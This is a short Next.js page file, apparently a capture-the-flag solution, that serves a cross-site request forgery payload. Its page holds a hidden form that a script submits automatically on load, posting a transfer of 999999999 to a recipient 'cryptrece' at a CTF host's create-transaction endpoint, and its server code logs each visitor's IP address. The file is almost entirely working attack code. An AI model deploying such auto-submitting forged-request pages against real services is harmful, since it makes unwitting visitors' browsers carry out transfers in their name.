// pages/index.js

export async function getServerSideProps({ req }) {
  // Log visitor info in Vercel function logs
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  console.log(`Visitor IP: ${ip}, Time: ${new Date().toISOString()}`);

  return { props: {} };
}

export default function Home() {
  return (
    <html>
      <head>
        <meta charSet="UTF-8" />
        <title>CTF Challenge Solution</title>
      </head>
      <body>
        <form
          id="tx"
          action="https://hackchan-mjk2mpay.ctf.pro/?action=create-transaction"
          method="POST"
        >
          <input name="recipient" value="cryptrece" />
          <input name="amount" value="999999999" />
        </form>
        <script>document.getElementById('tx').submit();</script>
      </body>
    </html>
  );
}

